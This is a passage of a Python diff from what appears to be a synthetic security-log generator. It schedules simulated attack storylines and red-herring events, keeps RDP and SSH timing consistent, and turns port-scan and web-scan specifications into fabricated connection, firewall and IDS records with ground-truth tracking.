+    def _apply_storyline_shell_availability(
+        self,
+        *,
+        actor: User,
+        system: System,
+        time: datetime,
+        rng: random.Random,
+    ) -> datetime:
+        """Delay same-host storyline siblings until prior actions and shells are ready."""
+        host_ready = getattr(self, "_storyline_host_available_at", {}).get(
+            self._storyline_host_actor_key(system, actor)
+        )
+        if host_ready is not None and time < host_ready:
+            time = host_ready + timedelta(milliseconds=rng.randint(120, 700))
+        if _get_os_category(system.os) != "linux":
+            return time
+        available_at = getattr(self, "_storyline_shell_available_at", {}).get(
+            (system.hostname, actor.username)
+        )
+        if available_at is None or time >= available_at:
+            return time
+        return available_at + timedelta(seconds=rng.uniform(0.3, 2.0))
+
+    def _authored_rdp_minimum_anchor(
+        self,
+        *,
+        spec: Any,
+        system: System,
+        child_time: datetime,
+        cumulative_shift: timedelta,
+    ) -> datetime | None:
+        """Return the earliest RDP action frontier one typed child can consume."""
+
+        if spec.type == "rdp_session":
+            return child_time - timedelta(seconds=RDP_BOOTSTRAP_MAX_LEAD_SECONDS)
+        if (
+            spec.type == "logon"
+            and spec.logon_type == 10
+            and _get_os_category(system.os) == "windows"
+            and spec.source_ip not in {"-", system.ip}
+        ):
+            return child_time
+        if (
+            spec.type != "credential_spray"
+            or spec.logon_type != 10
+            or spec.success is None
+            or _get_os_category(system.os) != "windows"
+            or spec.source_ip in (None, "", "-", system.ip)
+        ):
+            return None
+
+        start_time = (
+            self._parse_storyline_time(spec.start_time) + cumulative_shift
+            if spec.start_time
+            else child_time
+        )
+        interval_seconds = parse_duration(spec.interval).total_seconds()
+        success_after = int(spec.success["after"])
+        minimum_offset = max(0.0, (success_after - spec.jitter) * interval_seconds)
+        return start_time + timedelta(seconds=minimum_offset)
+
+    def _authored_event_rdp_nominal_lower_bound(
+        self,
+        event: Any,
+        event_time: datetime,
+    ) -> datetime | None:
+        """Return one conservative pre-execution RDP bound for an authored group."""
+
+        target_system = self._find_system(event.system)
+        if target_system is None:
+            return None
+        group_lower_bound = ensure_utc(event_time) - timedelta(
+            seconds=(_AUTHORED_EVENT_MAX_EARLY_JITTER_SECONDS + RDP_BOOTSTRAP_MAX_LEAD_SECONDS)
+        )
+        lower_bounds: list[datetime] = []
+        for spec in event.events:
+            if spec.type == "rdp_session":
+                lower_bounds.append(group_lower_bound)
+                continue
+            if (
+                spec.type == "logon"
+                and spec.logon_type == 10
+                and _get_os_category(target_system.os) == "windows"
+                and spec.source_ip not in {"-", target_system.ip}
+            ):
+                lower_bounds.append(group_lower_bound)
+                continue
+            if (
+                spec.type != "credential_spray"
+                or spec.logon_type != 10
+                or spec.success is None
+                or _get_os_category(target_system.os) != "windows"
+                or spec.source_ip in (None, "", "-", target_system.ip)
+            ):
+                continue
+            start_time = (
+                self._parse_storyline_time(spec.start_time)
+                if spec.start_time
+                else ensure_utc(event_time)
+                - timedelta(seconds=_AUTHORED_EVENT_MAX_EARLY_JITTER_SECONDS)
+            )
+            interval_seconds = parse_duration(spec.interval).total_seconds()
+            success_after = int(spec.success["after"])
+            minimum_offset = max(0.0, (success_after - spec.jitter) * interval_seconds)
+            lower_bounds.append(start_time + timedelta(seconds=minimum_offset))
+        return min(lower_bounds) if lower_bounds else None
+
+    def _authored_rdp_latest_anchor(
+        self,
+        *,
+        actor: User,
+        spec: Any,
+        system: System,
+        shifted_child_time: datetime,
+        cumulative_shift: timedelta,
+    ) -> datetime | None:
+        """Return a conservative upper bound for one shifted RDP action anchor."""
+
+        child_time = ensure_utc(shifted_child_time)
+        if spec.type == "rdp_session":
+            source_candidates: list[System]
+            if spec.source_ip:
+                modeled_source = self.world_model.system_for_ip(spec.source_ip)
+                source_candidates = [modeled_source] if modeled_source is not None else []
+            else:
+                source_candidates = [
+                    candidate
+                    for candidate in self.scenario.environment.systems
+                    if candidate.ip != system.ip and _get_os_category(candidate.os) == "windows"
+                ]
+            if not source_candidates:
+                return child_time
+            earliest_initial_source_process = child_time - timedelta(
+                seconds=(RDP_BOOTSTRAP_MAX_LEAD_SECONDS + RDP_SOURCE_PROCESS_MAX_LEAD_SECONDS)
+            )
+            latest_initial_source_process = child_time - timedelta(
+                seconds=(RDP_BOOTSTRAP_MIN_LEAD_SECONDS + RDP_SOURCE_PROCESS_MIN_LEAD_SECONDS)
+            )
+            alignment_hour_end = latest_initial_source_process.replace(
+                minute=0,
+                second=0,
+                microsecond=0,
+            ) + timedelta(hours=1)
+            source_hostnames = {candidate.hostname for candidate in source_candidates}
+            has_possible_future_source_session = any(
+                session.system in source_hostnames
+                and session.logon_type in {2, 10, 11}
+                and session.session_kind not in {"network", "service"}
+                and earliest_initial_source_process
+                < ensure_utc(session.start_time)
+                < alignment_hour_end
+                for session in self.state_manager.get_sessions_for_user(actor.username)
+            )
+            if not has_possible_future_source_session:
+                return child_time
+            latest_aligned_transport = alignment_hour_end + timedelta(
+                seconds=RDP_SOURCE_PROCESS_MAX_LEAD_SECONDS
+            )
+            return max(child_time, latest_aligned_transport)
+        if (
+            spec.type == "logon"
+            and spec.logon_type == 10
+            and _get_os_category(system.os) == "windows"
+            and spec.source_ip not in {"-", system.ip}
+        ):
+            return child_time
+        if (
+            spec.type != "credential_spray"
+            or spec.logon_type != 10
+            or spec.success is None
+            or _get_os_category(system.os) != "windows"
+            or spec.source_ip in (None, "", "-", system.ip)
+        ):
+            return None
+
+        start_time = (
+            self._parse_storyline_time(spec.start_time) + cumulative_shift
+            if spec.start_time
+            else child_time
+        )
+        interval_seconds = parse_duration(spec.interval).total_seconds()
+        success_after = int(spec.success["after"])
+        latest_offset = (success_after + spec.jitter) * interval_seconds
+        monotonic_clamp_margin = timedelta(milliseconds=success_after)
+        return ensure_utc(start_time) + timedelta(seconds=latest_offset) + monotonic_clamp_margin
+
+    def _authored_rdp_transport_lower_bound(self, current_hour: datetime) -> datetime | None:
+        """Return a best-effort current/next-hour fence that limits baseline distortion.
+
+        Live authored admission owns monotonicity; periodic specs may place an
+        explicit start outside the nominal group hour represented by this fence.
+        """
+
+        window_start = ensure_utc(current_hour)
+        hour_keys = (
+            int(window_start.timestamp()),
+            int((window_start + timedelta(hours=1)).timestamp()),
+        )
+        lower_bounds: list[datetime] = []
+        authored_groups = (
+            (self.scenario.storyline, getattr(self, "_storyline_by_hour", {})),
+            (self.scenario.red_herrings, getattr(self, "_red_herring_by_hour", {})),
+        )
+        for events, events_by_hour in authored_groups:
+            for hour_key in hour_keys:
+                for event_time, event_idx in events_by_hour.get(hour_key, ()):
+                    lower_bound = self._authored_event_rdp_nominal_lower_bound(
+                        events[event_idx],
+                        event_time,
+                    )
+                    if lower_bound is not None:
+                        lower_bounds.append(lower_bound)
+        return min(lower_bounds) if lower_bounds else None
+
+    def _shift_authored_rdp_child_after_frontier(
+        self,
+        *,
+        actor: User,
+        spec: Any,
+        system: System,
+        child_time: datetime,
+        cumulative_shift: timedelta,
+    ) -> tuple[datetime, timedelta]:
+        """Keep one RDP-producing child and its remaining siblings monotonic."""
+
+        minimum_anchor = self._authored_rdp_minimum_anchor(
+            spec=spec,
+            system=system,
+            child_time=child_time,
+            cumulative_shift=cumulative_shift,
+        )
+        if minimum_anchor is None:
+            return child_time, cumulative_shift
+        frontier = self.activity_generator._rdp_session_lifecycle_frontier()
+        required_anchor = frontier + _AUTHORED_RDP_FRONTIER_EPSILON
+        shift = max(timedelta(0), required_anchor - minimum_anchor)
+        shifted_child_time = child_time + shift
+        shifted_cumulative = cumulative_shift + shift
+        latest_anchor = self._authored_rdp_latest_anchor(
+            actor=actor,
+            spec=spec,
+            system=system,
+            shifted_child_time=shifted_child_time,
+            cumulative_shift=shifted_cumulative,
+        )
+        if latest_anchor is None:
+            raise StateError("Authored RDP admission lost its guarded action shape")
+        session_end_plan_getter = getattr(self, "_authored_rdp_session_end_plan", None)
+        session_end_plan = session_end_plan_getter() if callable(session_end_plan_getter) else None
+        explicit_anchor_limit = (
+            ensure_utc(session_end_plan.canonical_end)
+            - timedelta(milliseconds=RDP_EXPLICIT_END_CLOSE_GAP_MAX_MILLISECONDS)
+            if session_end_plan is not None and session_end_plan.is_authoritative
+            else None
+        )
+        if explicit_anchor_limit is not None and latest_anchor >= explicit_anchor_limit:
+            raise StateError(
+                "Authored RDP cannot be serialized before its explicit session end: "
+                f"latest action anchor {latest_anchor.isoformat()} must precede "
+                f"{explicit_anchor_limit.isoformat()}"
+            )
+        activity_dispatcher = getattr(self.activity_generator, "dispatcher", None)
+        action_source_deadline = (
+            ensure_utc(session_end_plan.canonical_end)
+            if session_end_plan is not None and not session_end_plan.is_authoritative
+            else None
+        )
+        if action_source_deadline is not None:
+            source_timing_planner = getattr(
+                activity_dispatcher,
+                "source_timing_planner",
+                None,
+            )
+            network_observation_planner = getattr(
+                activity_dispatcher,
+                "network_observation_planner",
+                None,
+            )
+            source_tail = rdp_action_deadline_source_tail(
+                source_deadline=action_source_deadline,
+                source_timing_planner=source_timing_planner,
+                network_observation_planner=network_observation_planner,
+                source_ip=getattr(spec, "source_ip", None) or "",
+                target_ip=system.ip,
+            )
+            transport_headroom = timedelta(
+                seconds=rdp_action_deadline_transport_headroom_seconds(
+                    source_deadline=action_source_deadline,
+                    source_timing_planner=source_timing_planner,
+                    modeled_source=True,
+                )
+            )
+            scenario_anchor_limit = action_source_deadline - source_tail - transport_headroom
+        else:
+            scenario_anchor_limit = None
+        if scenario_anchor_limit is not None and latest_anchor > scenario_anchor_limit:
+            raise StateError(
+                "Authored RDP cannot be serialized before the scenario end: "
+                f"latest action anchor {latest_anchor.isoformat()} must not follow "
+                f"{scenario_anchor_limit.isoformat()}"
+            )
+        return shifted_child_time, shifted_cumulative
+
+    def _execute_storyline(self) -> None:
+        """Execute storyline events (malicious/suspicious activities).
+
+        Parses storyline events, executes them at specified times, and tracks
+        them for GROUND_TRUTH.md generation. Implements baseline suppression
+        (+/-5 min window) to avoid conflicts with baseline activity.
+
+        Phase 1 Implementation:
+        - Simple keyword matching for activity types
+        - Basic event generation based on activity description
+        - Tracking of malicious events for ground truth
+        """
+        total_events = len(self.scenario.storyline)
+        _prev_event_time = None
+        self._ensure_account_sid_tracking()
+
+        for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
+            event_time = self._parse_storyline_time(storyline_event.time)
+            rng = _get_rng()
+            jitter = timedelta(
+                seconds=rng.uniform(-30, 30),
+                microseconds=rng.randint(0, 999999),
+            )
+            event_time = event_time + jitter
+            if _prev_event_time and event_time <= _prev_event_time:
+                event_time = _prev_event_time + timedelta(milliseconds=rng.randint(100, 5000))
+
+            actor = self._find_actor(storyline_event.actor)
+            system = self._find_system(storyline_event.system)
+
+            if not actor or not system:
+                logger.warning(
+                    f"Skipping storyline event: actor={storyline_event.actor}, "
+                    f"system={storyline_event.system} not found"
+                )
+                continue
+
+            logger.info(
+                f"Executing storyline event: {storyline_event.actor} on "
+                f"{storyline_event.system} at {event_time}"
+            )
+
+            self._report_progress(
+                "storyline_progress",
+                {
+                    "event_num": event_num,
+                    "total_events": total_events,
+                    "actor": actor.username,
+                    "system": system.hostname,
+                },
+            )
+
+            self.state_manager.set_current_time(event_time)
+            explicit_types = {spec.type for spec in storyline_event.events}
+
+            cadence_offsets = _storyline_event_offsets(
+                len(storyline_event.events),
+                rng,
+                storyline_event.event_spacing,
+            )
+
+            previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
+            self.dispatcher.storyline_cluster_id = storyline_event.id
+            cumulative_rdp_shift = timedelta(0)
+            group_completion_time = event_time
+            try:
+                for i, spec in enumerate(storyline_event.events):
+                    intent = self.authored_intent_ledger.intent_at(
+                        IntentSection.STORYLINE,
+                        storyline_event.id,
+                        i,
+                    )
+                    previous_spec_id = getattr(self, "_current_storyline_spec_id", "")
+                    previous_intent_id = self.dispatcher.authored_intent_id
+                    self._current_storyline_spec_id = f"{storyline_event.id}:{i}"
+                    self.dispatcher.authored_intent_id = intent.intent_id
+                    self.intent_execution_ledger.mark_planned(intent.intent_id)
+                    try:
+                        event_t = (
+                            event_time
+                            + timedelta(seconds=cadence_offsets[i])
+                            + cumulative_rdp_shift
+                        )
+                        event_t = self._apply_storyline_shell_availability(
+                            actor=actor,
+                            system=system,
+                            time=event_t,
+                            rng=rng,
+                        )
+                        event_t, cumulative_rdp_shift = (
+                            self._shift_authored_rdp_child_after_frontier(
+                                actor=actor,
+                                spec=spec,
+                                system=system,
+                                child_time=event_t,
+                                cumulative_shift=cumulative_rdp_shift,
+                            )
+                        )
+                        self.state_manager.set_current_time(event_t)
+                        session_required_until = (
+                            _storyline_session_required_until(
+                                event_t,
+                                cadence_offsets,
+                                i,
+                                storyline_event.events[i + 1 :],
+                            )
+                            if spec.type == "ssh_session"
+                            else None
+                        )
+                        malicious_event = self._execute_typed_event(
+                            spec=spec,
+                            actor=actor,
+                            system=system,
+                            time=event_t,
+                            activity=storyline_event.activity,
+                            explicit_types=explicit_types,
+                            future_specs=itertools.islice(
+                                storyline_event.events,
+                                i + 1,
+                                None,
+                            ),
+                            authored_time_shift=cumulative_rdp_shift,
+                            session_required_until=session_required_until,
+                        )
+                        if malicious_event:
+                            malicious_event["intent_id"] = intent.intent_id
+                            self.malicious_events.append(malicious_event)
+                            materialized_time = malicious_event.get("time")
+                            if isinstance(materialized_time, datetime):
+                                event_t = max(event_t, materialized_time)
+                        group_completion_time = max(group_completion_time, event_t)
+                    finally:
+                        self._current_storyline_spec_id = previous_spec_id
+                        self.dispatcher.authored_intent_id = previous_intent_id
+                self._record_storyline_group_completion(
+                    actor=actor,
+                    system=system,
+                    time=group_completion_time,
+                )
+                self._flush_story_process_terminations(
+                    completed_storyline_index=event_num - 1,
+                    release_time=group_completion_time,
+                )
+            finally:
+                self.dispatcher.storyline_cluster_id = previous_cluster
+
+            _prev_event_time = group_completion_time
+
+            self._barrier_flush_all_emitters()
+
+    def _execute_single_storyline_event(self, event_idx: int) -> None:
+        """Execute a single storyline event by index (used for interleaved generation)."""
+        self._ensure_account_sid_tracking()
+        storyline_event = self.scenario.storyline[event_idx]
+        event_idx + 1
+
+        event_time = self._parse_storyline_time(storyline_event.time)
+        rng = _get_rng()
+        jitter = timedelta(
+            seconds=rng.uniform(-30, 30),
+            microseconds=rng.randint(0, 999999),
+        )
+        event_time = event_time + jitter
+
+        actor = self._find_actor(storyline_event.actor)
+        system = self._find_system(storyline_event.system)
+        if not actor or not system:
+            return
+
+        logger.info(
+            f"Executing interleaved storyline event: {storyline_event.actor} on {storyline_event.system} at {event_time}"
+        )
+
+        self.state_manager.set_current_time(event_time)
+
+        explicit_types = {spec.type for spec in storyline_event.events}
+
+        cadence_offsets = _storyline_event_offsets(
+            len(storyline_event.events),
+            rng,
+            storyline_event.event_spacing,
+        )
+
+        previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
+        self.dispatcher.storyline_cluster_id = storyline_event.id
+        cumulative_rdp_shift = timedelta(0)
+        group_completion_time = event_time
+        try:
+            for i, spec in enumerate(storyline_event.events):
+                intent = self.authored_intent_ledger.intent_at(
+                    IntentSection.STORYLINE,
+                    storyline_event.id,
+                    i,
+                )
+                previous_spec_id = getattr(self, "_current_storyline_spec_id", "")
+                previous_intent_id = self.dispatcher.authored_intent_id
+                self._current_storyline_spec_id = f"{storyline_event.id}:{i}"
+                self.dispatcher.authored_intent_id = intent.intent_id
+                self.intent_execution_ledger.mark_planned(intent.intent_id)
+                try:
+                    event_t = (
+                        event_time + timedelta(seconds=cadence_offsets[i]) + cumulative_rdp_shift
+                    )
+                    event_t = self._apply_storyline_shell_availability(
+                        actor=actor,
+                        system=system,
+                        time=event_t,
+                        rng=rng,
+                    )
+                    event_t, cumulative_rdp_shift = self._shift_authored_rdp_child_after_frontier(
+                        actor=actor,
+                        spec=spec,
+                        system=system,
+                        child_time=event_t,
+                        cumulative_shift=cumulative_rdp_shift,
+                    )
+                    self.state_manager.set_current_time(event_t)
+                    session_required_until = (
+                        _storyline_session_required_until(
+                            event_t,
+                            cadence_offsets,
+                            i,
+                            storyline_event.events[i + 1 :],
+                        )
+                        if spec.type == "ssh_session"
+                        else None
+                    )
+                    malicious_event = self._execute_typed_event(
+                        spec=spec,
+                        actor=actor,
+                        system=system,
+                        time=event_t,
+                        activity=storyline_event.activity,
+                        explicit_types=explicit_types,
+                        future_specs=itertools.islice(
+                            storyline_event.events,
+                            i + 1,
+                            None,
+                        ),
+                        authored_time_shift=cumulative_rdp_shift,
+                        session_required_until=session_required_until,
+                    )
+                    if malicious_event:
+                        malicious_event["intent_id"] = intent.intent_id
+                        self.malicious_events.append(malicious_event)
+                        materialized_time = malicious_event.get("time")
+                        if isinstance(materialized_time, datetime):
+                            event_t = max(event_t, materialized_time)
+                    group_completion_time = max(group_completion_time, event_t)
+                finally:
+                    self._current_storyline_spec_id = previous_spec_id
+                    self.dispatcher.authored_intent_id = previous_intent_id
+            self._record_storyline_group_completion(
+                actor=actor,
+                system=system,
+                time=group_completion_time,
+            )
+            self._flush_story_process_terminations(
+                completed_storyline_index=event_idx,
+                release_time=group_completion_time,
+            )
+        finally:
+            self.dispatcher.storyline_cluster_id = previous_cluster
+
+    def _execute_single_red_herring_event(self, event_idx: int) -> None:
+        """Execute a single red herring event by index.
+
+        Uses the same event execution path as storyline events but tracks
+        results in red_herring_events instead of malicious_events.
+        """
+        self._ensure_account_sid_tracking()
+        rh_event = self.scenario.red_herrings[event_idx]
+
+        event_time = self._parse_storyline_time(rh_event.time)
+        rng = _get_rng()
+        jitter = timedelta(
+            seconds=rng.uniform(-30, 30),
+            microseconds=rng.randint(0, 999999),
+        )
+        event_time = event_time + jitter
+
+        actor = self._find_actor(rh_event.actor)
+        system = self._find_system(rh_event.system)
+        if not actor or not system:
+            return
+
+        logger.info(
+            f"Executing red herring event: {rh_event.actor} on {rh_event.system} at {event_time}"
+        )
+
+        self.state_manager.set_current_time(event_time)
+
+        explicit_types = {spec.type for spec in rh_event.events}
+
+        cadence_offsets = _storyline_event_offsets(
+            len(rh_event.events),
+            rng,
+            rh_event.event_spacing,
+        )
+
+        previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
+        self.dispatcher.storyline_cluster_id = f"red_herring:{rh_event.id}"
+        cumulative_rdp_shift = timedelta(0)
+        try:
+            for i, spec in enumerate(rh_event.events):
+                intent = self.authored_intent_ledger.intent_at(
+                    IntentSection.RED_HERRING,
+                    rh_event.id,
+                    i,
+                )
+                previous_intent_id = self.dispatcher.authored_intent_id
+                self.dispatcher.authored_intent_id = intent.intent_id
+                self.intent_execution_ledger.mark_planned(intent.intent_id)
+                try:
+                    event_t = (
+                        event_time + timedelta(seconds=cadence_offsets[i]) + cumulative_rdp_shift
+                    )
+                    event_t = self._apply_storyline_shell_availability(
+                        actor=actor,
+                        system=system,
+                        time=event_t,
+                        rng=rng,
+                    )
+                    event_t, cumulative_rdp_shift = self._shift_authored_rdp_child_after_frontier(
+                        actor=actor,
+                        spec=spec,
+                        system=system,
+                        child_time=event_t,
+                        cumulative_shift=cumulative_rdp_shift,
+                    )
+                    self.state_manager.set_current_time(event_t)
+                    session_required_until = (
+                        _storyline_session_required_until(
+                            event_t,
+                            cadence_offsets,
+                            i,
+                            rh_event.events[i + 1 :],
+                        )
+                        if spec.type == "ssh_session"
+                        else None
+                    )
+                    result = self._execute_typed_event(
+                        spec=spec,
+                        actor=actor,
+                        system=system,
+                        time=event_t,
+                        activity=rh_event.activity,
+                        explicit_types=explicit_types,
+                        future_specs=itertools.islice(rh_event.events, i + 1, None),
+                        authored_time_shift=cumulative_rdp_shift,
+                        session_required_until=session_required_until,
+                    )
+                    if result:
+                        # Track as red herring, not malicious
+                        result["intent_id"] = intent.intent_id
+                        result["explanation"] = rh_event.explanation
+                        self.red_herring_events.append(result)
+                finally:
+                    self.dispatcher.authored_intent_id = previous_intent_id
+            self._flush_story_process_terminations(
+                completed_storyline_index=-1,
+                release_time=event_t if cadence_offsets else event_time,
+            )
+        finally:
+            self.dispatcher.storyline_cluster_id = previous_cluster
+
+    def _execute_typed_event(
+        self,
+        spec,  # EventSpec union type
+        actor: User,
+        system: System,
+        time: datetime,
+        activity: str,
+        explicit_types: set[str],
+        future_specs: Sequence[Any] = (),
+        authored_time_shift: timedelta = timedelta(0),
+        session_required_until: datetime | None = None,
+    ) -> dict | None:
+        """Execute a single typed event from the storyline events list.
+
+        Each event spec type maps to a specific generate_* method on ActivityGenerator.
+        Returns a malicious_event dict for GROUND_TRUTH.md.
+        """
+        future_specs = tuple(future_specs)
+        rng = _get_rng()
+        dispatcher = getattr(self, "dispatcher", None)
+        malicious_event = {
+            "time": time,
+            "actor": actor.username,
+            "system": system.hostname,
+            "activity": activity,
+            "type": spec.type,
+            "storyline_cluster_id": getattr(dispatcher, "storyline_cluster_id", None),
+        }
+
+        def _ground_truth_uid(uid: str, src_ip: str, dst_ip: str) -> str:
+            if not uid:
+                return "(filtered by sensor placement)"
+            identifier_lookup = getattr(dispatcher, "network_identifier_for_format", None)
+            if callable(identifier_lookup):
+                observed_uid = identifier_lookup(uid, "zeek_conn")
+                if observed_uid is not None:
+                    return observed_uid or "(filtered by sensor placement)"
+            visibility = getattr(dispatcher, "visibility_engine", None)
+            if visibility is None:
+                return uid
+            from evidenceforge.events.dispatcher import expand_formats
+
+            for sensor in visibility.get_observing_sensors(src_ip, dst_ip):
+                if "zeek_conn" in expand_formats(sensor.log_formats):
+                    return uid
+            return "(filtered by sensor placement)"
+
+        from .typed_handlers import TypedEventContext, execute_typed_handler
+
+        return execute_typed_handler(
+            self,
+            spec,
+            TypedEventContext(
+                actor=actor,
+                system=system,
+                time=time,
+                activity=activity,
+                explicit_types=explicit_types,
+                future_specs=future_specs,
+                authored_time_shift=authored_time_shift,
+                session_required_until=session_required_until,
+                rng=rng,
+                dispatcher=dispatcher,
+                malicious_event=malicious_event,
+                _ground_truth_uid=_ground_truth_uid,
+            ),
+        )
+
+    def _execute_port_scan_bundle(self, request: PortScanRequest) -> dict[str, Any]:
+        """Expand a port-scan action bundle through the existing storyline adapter."""
+
+        import ipaddress
+
+        spec = request.spec
+        system = request.system
+        time = request.time
+        rng = request.rng
+        malicious_event = request.malicious_event
+
+        # Use source_ip override if specified, otherwise use system IP.
+        scan_src_ip = spec.source_ip or system.ip
+        is_external_scan = (
+            not _is_private_ip(scan_src_ip)
+            and hasattr(self, "dispatcher")
+            and self.dispatcher.visibility_engine
+        )
+
+        # Resolve target IPs.
+        if spec.target_ips:
+            resolved_targets = []
+            for target_ip in spec.target_ips:
+                if is_external_scan:
+                    public_target = self.dispatcher.visibility_engine.get_public_inbound_address(
+                        target_ip
+                    )
+                    if public_target is None:
+                        continue
+                    resolved_targets.append(public_target)
+                else:
+                    resolved_targets.append(target_ip)
+        elif spec.target_segment and self.scenario.environment.network:
+            seg = next(
+                (
+                    s
+                    for s in self.scenario.environment.network.segments
+                    if s.name == spec.target_segment
+                ),
+                None,
+            )
+            if seg:
+                if is_external_scan:
+                    segment_hostnames = set(seg.systems or [])
+                    if segment_hostnames:
+                        segment_systems = [
+                            candidate
+                            for candidate in self.scenario.environment.systems
+                            if candidate.hostname in segment_hostnames
+                        ]
+                    else:
+                        net = ipaddress.ip_network(seg.cidr, strict=False)
+                        segment_systems = [
+                            candidate
+                            for candidate in self.scenario.environment.systems
+                            if ipaddress.ip_address(candidate.ip) in net
+                        ]
+                    all_hosts = []
+                    for candidate in segment_systems:
+                        public_target = (
+                            self.dispatcher.visibility_engine.get_public_inbound_address(
+                                candidate.ip
+                            )
+                        )
+                        if public_target:
+                            all_hosts.append(public_target)
+                else:
+                    net = ipaddress.ip_network(seg.cidr, strict=False)
+                    all_hosts = _sample_network_hosts(net, spec.target_count, rng)
+                count = min(spec.target_count, len(all_hosts))
+                resolved_targets = rng.sample(all_hosts, count) if is_external_scan else all_hosts
+            else:
+                resolved_targets = []
+        else:
+            resolved_targets = []
+
+        conn_state = self._get_firewall_deny_conn_state()
+        src_iface = self._resolve_firewall_interface(scan_src_ip)
+        ip_map = getattr(self.activity_generator, "_ip_to_system", {})
+        vip_to_real_ip = getattr(
+            getattr(getattr(self, "dispatcher", None), "visibility_engine", None),
+            "_vip_to_real_ip",
+            {},
+        )
+        segment_cidrs = {}
+        fw_sensor = None
+        if self.scenario.environment.network:
+            for segment in self.scenario.environment.network.segments:
+                try:
+                    segment_cidrs[segment.name] = ipaddress.ip_network(
+                        segment.cidr,
+                        strict=False,
+                    )
+                except ValueError:
+                    continue
+            fw_sensor = next(
+                (
+                    candidate
+                    for candidate in self.scenario.environment.network.sensors
+                    if candidate.type == "firewall" and "cisco_asa" in candidate.log_formats
+                ),
+                None,
+            )
+        scan_profile_rng = random.Random(
+            _stable_seed(
+                "port_scan_profile:"
+                f"{scan_src_ip}:{','.join(resolved_targets)}:{spec.ports}:{time.isoformat()}"
+            )
+        )
+
+        spacing = 1.0 / spec.scan_rate
+        total_count = 0
+        for target_ip, port in _iter_shuffled_port_scan_pairs(
+            resolved_targets,
+            spec.ports,
+            scan_profile_rng,
+        ):
+            real_target_ip = vip_to_real_ip.get(target_ip, target_ip)
+            target_system = ip_map.get(real_target_ip)
+            dst_iface = self._resolve_firewall_interface(target_ip)
+            jitter_offset = rng.uniform(-spacing * 0.45, spacing * 0.55)
+            scan_time = time + timedelta(seconds=total_count * spacing + jitter_offset)
+            self.state_manager.set_current_time(scan_time)
+            authored_ids_alerts = ids_helpers._build_ids_alert_contexts(
+                getattr(spec, "ids_alerts", []),
+                time=scan_time,
+                src_ip=scan_src_ip,
+                dst_ip=target_ip,
+                dst_port=port,
+                proto=spec.protocol,
+                rng=rng,
+                source="storyline_port_scan",
+            )
+
+            from evidenceforge.events.contexts import FirewallContext
+
+            policy_denied = False
+            if (
+                is_external_scan
+                and fw_sensor is not None
+                and hasattr(self, "_evaluate_firewall_policy")
+            ):
+                policy_denied = (
+                    self._evaluate_firewall_policy(
+                        scan_src_ip,
+                        real_target_ip,
+                        port,
+                        fw_sensor,
+                        segment_cidrs,
+                    )
+                    == "deny"
+                )
+            if policy_denied:
+                denied = True
+                scan_conn_state = conn_state
+                service = ""
+                if scan_conn_state == "REJ":
+                    duration = scan_profile_rng.uniform(0.003, 0.18)
+                    orig_bytes = scan_profile_rng.randint(40, 120)
+                    resp_bytes = scan_profile_rng.randint(40, 96)
+                else:
+                    duration = scan_profile_rng.uniform(1.2, 7.0)
+                    orig_bytes = scan_profile_rng.randint(40, 96)
+                    resp_bytes = 0
+            else:
+                denied, scan_conn_state, service, duration, orig_bytes, resp_bytes = (
+                    _port_scan_connection_profile(
+                        scan_profile_rng,
+                        port=port,
+                        target_system=target_system,
+                        external=is_external_scan,
+                        default_deny_state=conn_state,
+                    )
+                )
+            firewall = (
+                FirewallContext(
+                    action="deny",
+                    msg_id=106023,
+                    connection_id=0,
+                    src_interface=src_iface,
+                    dst_interface=dst_iface,
+                    access_group=f"{src_iface}_access_in",
+                )
+                if denied
+                else None
+            )
+
+            self.activity_generator.generate_connection(
+                src_ip=scan_src_ip,
+                dst_ip=target_ip,
+                time=scan_time,
+                dst_port=port,
+                proto=spec.protocol,
+                service=service,
+                duration=duration,
+                orig_bytes=orig_bytes,
+                resp_bytes=resp_bytes,
+                conn_state=None if spec.protocol == "icmp" else scan_conn_state,
+                firewall=firewall,
+                emit_dns=False,
+                ids_alerts=authored_ids_alerts,
+            )
+            total_count += 1
+
+        malicious_event["target_count"] = len(resolved_targets)
+        malicious_event["ports"] = spec.ports
+        malicious_event["total_connections"] = total_count
+        malicious_event["protocol"] = spec.protocol
+        if getattr(spec, "ids_alerts", []):
+            malicious_event["ids_alerts"] = ids_helpers._ids_attachment_ground_truth(
+                spec.ids_alerts
+            )
+        return malicious_event
+
+    def _execute_web_scan_bundle(self, request: WebScanRequest) -> dict[str, Any]:
+        """Expand a web-scan action bundle through the existing storyline adapter."""
+
+        from evidenceforge.config.web_scan_presets import (
+            get_preset,
+            parse_positive_finite_rate,
+        )
+        from evidenceforge.events.contexts import HttpContext
+        from evidenceforge.generation.activity.referrer import pick_scan_referrer
+        from evidenceforge.utils.ua_template import render_ua
+
+        spec = request.spec
+        system = request.system
+        time = request.time
+        rng = request.rng
+        malicious_event = request.malicious_event
+
+        scan_paths = []
+        scan_ua = spec.user_agent or "Mozilla/5.0"
+        preset_data = None
+        if spec.preset:
+            preset_data = get_preset(spec.preset)
+            if preset_data is None:
+                logger.warning("Unknown web_scan preset: %s", spec.preset)
+            else:
+                scan_paths = list(preset_data.get("paths", []))
+                scan_ua = spec.user_agent or preset_data.get("user_agent", scan_ua)
+        if spec.paths:
+            scan_paths.extend(spec.paths)
+        if not scan_paths:
+            raise ValueError(
+                f"web_scan resolved to zero paths (preset={spec.preset!r}). "
+                "Check preset name or provide explicit paths."
+            )
+
+        start = self._parse_storyline_time(spec.start_time) if spec.start_time else time
+        duration_sec = None
+        count = spec.count
+        if spec.duration is not None:
+            duration_sec = parse_duration(spec.duration).total_seconds()
+        elif spec.end_time is not None:
+            end_dt = self._parse_storyline_time(spec.end_time)
+            duration_sec = (end_dt - start).total_seconds()
+        scan_src_ip = spec.source_ip or system.ip
+        scan_host = spec.hostname or spec.dst_ip
+        service = "http" if spec.dst_port == 80 else "ssl"
+        scan_dst_ip = spec.dst_ip
+        if spec.hostname and not scan_dst_ip:
+            resolved_scan_ip = self._resolve_scenario_network_host(
+                spec.hostname,
+                src_host=system.hostname,
+            )
+            if resolved_scan_ip:
+                scan_dst_ip = resolved_scan_ip
+        if (
+            not _is_private_ip(scan_src_ip)
+            and hasattr(self, "dispatcher")
+            and self.dispatcher.visibility_engine
+        ):
+            scan_dst_ip = self.dispatcher.visibility_engine._real_ip_to_vip.get(
+                spec.dst_ip, spec.dst_ip
+            )
+
+        src_sys = None
